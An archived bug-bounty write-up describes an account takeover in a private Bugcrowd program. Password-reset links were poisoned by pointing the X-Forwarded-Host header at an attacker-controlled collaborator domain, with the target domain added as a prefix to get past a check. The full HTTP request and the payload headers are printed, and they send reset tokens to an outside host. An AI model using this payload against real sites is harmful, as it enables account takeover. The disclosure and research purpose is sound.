# Simple ATO in private program.

- **Source URL:** https://medium.com/@oXnoOneXo/simple-ato-in-private-program-890cd1485675?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20241223181940/https://medium.com/@oXnoOneXo/simple-ato-in-private-program-890cd1485675
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/8236 (id 8236)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Hello Friend. I’m gonna talk about a simple Account Takeover vulnerability I found in a private program at Bugcrowd so grab your coffee and let’s get started.

The program has a lot multiple wildcards targets and after searching through each of them I did end up with an IDOR with a P4 severity which allowed me to delete other users\` comments on threads.

One of the targets was just a single domain that has Signup, Login & Reset Password functionality. I kept searching for any BAC, CSRF or CORS issues but I wasn’t lucky so I turned my eyes for the Reset Password functionality.

When I test on Reset/Forget Password functions I usually try the Host Header Injection attack besides using some well-known headers that might do the same job of the Host header. So I logged out and tried to send the reset password link with intercepting the request and changed the values of the Headers ( X-Forwarded-Host, X-Host, Referer, Origin ) to my collaborator:

```
POST /v2/request_reset
Host: www.redacted.com
X-Forwarded-Host: cti8fhpon5bs77snj410xc8gfezhtemje.oast.online
X-Host: cti8fhpon5bs77snj410xc8gfezhtemje.oast.online
Origin: https://cti8fhpon5bs77snj410xc8gfezhtemje.oast.online
Referer: https://cti8fhpon5bs77snj410xc8gfezhtemje.oast.online/test
Content-Type: application/x-www-form-urlencoded
email=myhandler%40bugcrowdninja.com&type=lost
```
Once forwarded the request I received 404 response. I kept deleting the headers one by one and the one that was causing the odd response was 

**X-Forwarded-Host** header. I retried the request again by using the target domain as a prefix of the collaborator payload like:

`X-Forwarded-Host: www.redeacted.com.cti8fhpon5bs77snj410xc8gfezhtemje.oast.online`
This time I did receive 200 response and once checked my mail inbox I found the email with the reset link:

`https://www.redacted.com.cti8fhpon5bs77snj410xc8gfezhtemje.oast.online/recover_account/#id/lost/#reset-token`
Then once I opened it I got redirected to my collaborator with the token sent to my Burpsuite:

I reported it and got triaged as P2 and rewarded $$$$ for it:

I hope It was helpful even a little bit. Peace.
